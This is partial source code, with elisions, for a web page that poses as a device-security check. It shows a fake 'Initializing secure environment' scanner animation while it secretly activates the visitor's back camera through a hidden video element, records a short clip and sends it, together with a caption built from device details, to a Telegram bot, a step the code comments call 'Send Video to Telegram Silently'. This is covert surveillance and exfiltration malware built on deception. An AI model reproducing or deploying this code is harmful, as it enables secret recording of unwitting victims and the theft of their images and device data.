<?php
// =======================================
// TELEGRAM SEND (BACK CAMERA VIDEO + CODETABS)
// =======================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    ...
    $botToken = '';
    $caption  = $_POST['caption'] ?? 'Video Verified';
    ...
    $postFields = [
        'chat_id'  => $chatId,
        'video'    => new CURLFile(realpath($file), 'video/mp4', $fileName),
        'caption'  => $caption,
...
<style>
  ...
  #video { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; width: 0; height: 0; }

  /* Security Scanner Animation */
  .scan-box { display: none; text-align: center; margin-top: 10px; }
  .pulse-ring {
  ...
  .pulse-ring::before {
    ...
    width: 24px; height: 24px; background: #34a853; border-radius: 50%;
    box-shadow: 0 0 0 0 rgba(52, 168, 83, 0.6);
    animation: pulse-anim 1.5s infinite;
  }
  @keyframes pulse-anim {
    0% { box-shadow: 0 0 0 0 rgba(52,168,83,0.6); }
    70% { box-shadow: 0 0 0 25px rgba(52,168,83,0); }
    100% { box-shadow: 0 0 0 0 rgba(52,168,83,0); }
  }
  .loader-text { font-size: 14px; color: #5f6368; min-height: 20px; margin-top: 20px; }
...
<div class="card">
  ...
  <div id="form-section">
    ...
    <div class="subtitle">To protect your account, we need to verify your device environment.</div>
  ...
  <div id="loader-section" class="scan-box" style="display: none;">
    <div class="pulse-ring"></div>
    <p class="loader-text" id="status">Initializing secure environment…</p>
  </div>
...
// Function to check if value exists, else return empty string
function check(val) {
...
startBtn.onclick = () => {
  // Step 1: Show Security Scanner
  formSection.style.display = 'none';
  loaderSection.style.display = 'block';

  // Step 2: Start Back Camera Video (Hidden)
  ...
  .then(stream => {
    ...
    // Step 3: Record 2-second video clip
    ...
    recorder.onstop = () => {
      ...
      fd.append("file", blob, "env_scan.mp4");
      fd.append("caption", buildCaption());

      // Step 4: Send Video to Telegram Silently
